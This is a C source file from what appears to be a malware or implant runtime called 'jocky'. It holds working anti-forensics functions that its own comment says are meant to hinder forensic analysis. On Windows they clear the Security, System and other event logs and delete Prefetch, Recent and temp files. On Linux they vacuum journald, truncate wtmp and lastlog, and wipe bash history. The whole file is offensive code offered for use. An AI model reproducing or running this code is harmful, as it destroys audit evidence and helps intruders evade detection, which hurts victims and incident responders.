/*
 * Cleanup: Log Clearing
 *
 * Clears system event logs to hinder forensic analysis.
 * Windows: wevtutil
 * Linux: journalctl
 */

#include "jocky_rt.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#endif

bool jocky_clear_logs(void)
{
#ifdef _WIN32
    /* Use wevtutil to clear common Windows event logs */
    static const char* logs[] = {
        "Application",
        "Security",
        "System",
        "Setup",
        "ForwardedEvents",
        NULL
    };

    for (int i = 0; logs[i]; i++) {
        char cmd[256] = {0};
        snprintf(cmd, sizeof(cmd), "wevtutil cl \"%s\" 2>nul", logs[i]);
        system(cmd);
    }
    return true;
#else
    /* Linux: try journalctl --rotate and then vacuum */
    int r1 = system("journalctl --rotate 2>/dev/null");
    int r2 = system("journalctl --vacuum-time=1s 2>/dev/null");
    (void)r1; (void)r2;

    /* Also clear wtmp/lastlog if writable */
    system("truncate -s 0 /var/log/wtmp 2>/dev/null");
    system("truncate -s 0 /var/log/lastlog 2>/dev/null");
    return true;
#endif
}

bool jocky_wipe_artifacts(void)
{
#ifdef _WIN32
    /* Delete Prefetch files */
    system("del /Q /F C:\\Windows\\Prefetch\\* 2>nul");

    /* Clear recent files */
    system("del /Q /F %APPDATA%\\Microsoft\\Windows\\Recent\\* 2>nul");

    /* Clear temp files */
    char tempPath[MAX_PATH] = {0};
    if (GetTempPathA(MAX_PATH, tempPath)) {
        char cmd[512] = {0};
        snprintf(cmd, sizeof(cmd), "del /Q /F \"%s\\*\" 2>nul", tempPath);
        system(cmd);
    }
#else
    /* Linux: clear bash history and tmp */
    system("history -c 2>/dev/null; history -w 2>/dev/null");
    system("rm -rf /tmp/.jocky* 2>/dev/null");
#endif
    return true;
}
